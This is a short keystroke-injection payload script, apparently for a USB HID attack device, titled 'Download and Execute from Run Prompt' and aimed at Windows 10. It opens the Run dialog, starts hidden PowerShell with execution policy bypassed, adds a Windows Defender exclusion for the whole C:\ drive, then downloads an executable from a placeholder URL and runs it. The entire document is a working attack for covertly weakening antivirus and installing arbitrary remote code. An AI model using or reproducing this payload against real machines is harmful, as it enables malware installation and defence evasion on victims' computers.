// =============================================================================
// Title: Download and Execute from Run Prompt
// Author: @beigeworm | https://github.com/beigeworm
// Description: Download and Execute any file from the Run Prompt.
// Target: Windows 10
// =============================================================================

// *USB SETTING*
// startup

// =============================================================================

// script setup
layout("us")


press("GUI r");
delay(1000);
type("powershell -NoP -NonI -W Hidden -Exec Bypass -C cd $env:Temp;Add-MpPreference -ExclusionPath C:\\;Start-Sleep 1;");
delay(500);
type("iwr -Uri FILE_URL_HERE -OutFile upl.exe;Start-Sleep 1;Start upl.exe;exit");
delay(500);
press("ENTER");

